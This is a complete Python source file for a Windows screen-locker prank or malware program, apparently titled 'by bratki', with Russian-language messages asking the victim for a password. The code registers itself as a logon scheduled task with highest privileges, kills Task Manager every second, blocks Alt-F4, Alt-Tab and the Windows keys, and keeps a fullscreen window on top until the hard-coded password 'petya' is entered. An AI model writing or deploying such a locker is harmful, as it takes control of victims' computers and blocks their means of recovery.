from tkinter import *
from tkinter import ttk
import getpass
import sys
import os
import psutil
import signal
import pyautogui
import subprocess
import keyboard

USER_NAME = getpass.getuser()

if getattr(sys, 'frozen', False):
    APP_PATH = sys.executable
else:
    APP_PATH = os.path.abspath(__file__)

TASK_NAME = "ClubLockTask"

def create_task():
    command = f'schtasks /create /tn "{TASK_NAME}" /tr "{APP_PATH}" /sc onlogon /rl highest /f'
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при создании задачи: {e}")

def delete_task():
    command = f'schtasks /delete /tn "{TASK_NAME}" /f'
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при удалении задачи: {e}")

def monitor_taskmgr():
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                os.kill(proc.info['pid'], signal.SIGTERM)
        except Exception:
            pass
    window.after(1000, monitor_taskmgr)

window = Tk()
window.title("by bratki")
window.geometry('400x250')
window['bg'] = 'black'
window.attributes('-fullscreen', True, '-topmost', True)

normal_width = 1920
normal_height = 1080
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)
scale_factor = ((percentage_width + percentage_height) / 2) / 100
fontsize = max(int(20 * scale_factor), 10)
fontsizeHding = max(int(72 * scale_factor), 40)
default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))

def clicked():
    if txt.get() == "petya":
        delete_task()
        sys.exit()

def block_close():
    pass

def block_keys(event=None):
    return "break"

def keep_on_top():
    window.lift()
    window.attributes('-topmost', True)
    window.after(500, keep_on_top)

def move_mouse():
    pyautogui.moveTo(680, 800)
    window.after(1000, move_mouse)

txt_one = Label(window, text='by bratki', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='Друнчик, извини :(', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Пожалуйста, введи пароль для получения доступа к компьютеру!', font=("Arial Bold", fontsize), fg='white', bg='black')

txt_one.place(relx=.01, rely=.01)
txt_two.place(relx=.01, rely=.11)
txt_three.place(relx=.01, rely=.21)

txt = Entry(window)
btn = Button(window, text="ВВОД КОДА", command=clicked)
txt.place(relx=.28, rely=.5, relwidth=.3, relheight=.06)
btn.place(relx=.62, rely=.5, relwidth=.1, relheight=.06)

window.protocol("WM_DELETE_WINDOW", block_close)
window.bind_all("<Alt-F4>", block_keys)
window.bind_all("<Control-Escape>", block_keys)
window.bind_all("<Alt-Tab>", block_keys)
window.bind_all("<Win_L>", block_keys)
window.bind_all("<Win_R>", block_keys)
keyboard.block_key('windows')
keyboard.block_key('d')
keyboard.block_key('tab')

create_task()
monitor_taskmgr()
keep_on_top()
# move_mouse()

window.mainloop()
